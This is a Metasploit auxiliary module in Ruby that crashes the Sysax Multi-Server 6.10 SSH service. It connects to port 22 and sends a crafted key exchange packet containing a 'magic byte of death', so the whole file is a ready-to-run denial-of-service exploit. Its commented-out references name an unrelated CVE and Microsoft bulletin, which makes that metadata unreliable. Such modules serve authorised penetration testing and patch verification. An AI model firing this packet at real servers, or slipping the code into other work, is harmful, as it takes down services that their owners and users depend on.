##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sysax Multi-Server 6.10 SSHD Key Exchange DoS',
			'Description'    => %q{
				This module sends a specially-crafted SSH Key Exchange causing the
				service to crash.
			},
			'Author'         => 'Matt "hostess" Andreko <mandreko[at]accuvant.com>',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					# [ 'BID', '17908'],
					# [ 'CVE', '2006-0027'],
					# [ 'MSB', 'MS06-019'],

				],
			'DisclosureDate' => 'Mar 17 2013'))

		register_options(
			[
				Opt::RPORT(22),
				OptString.new('CLIENTVERSION', [ true, 'The SSH client version to report.', 'SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1'])
			], self.class)

	end

	def get_packet

		delimiter = "\x00"*3
		packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
			0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
			0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
			0x00, 0x7e].pack("C*")
		packet << Rex::Text.rand_text_alphanumeric(126)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(16)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(158)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(158)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(106)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(106)
		packet << delimiter
		packet << "\x28" # Magic byte of death - seems to work with just about
						# anything except \x1a, the value it's suppposed to be
		packet << Rex::Text.rand_text_alphanumeric(26)
		packet << delimiter
		packet << Rex::Text.rand_text_alphanumeric(27)
		packet << delimiter*7
	end

	def run

		connect

		banner = sock.get_once(-1, 10) || ''
		print_status("Banner: #{banner.strip}")
		sock.put(datastore['CLIENTVERSION'] + "\r\n" + get_packet())

		# Sometimes the socket closes faster than it can read, sometimes it doesn't, so catch the error just in case.
		begin
			print "<< " + (sock.get_once(-1, 10) || '')
		rescue Errno::ECONNRESET
		end

		disconnect
	end

end
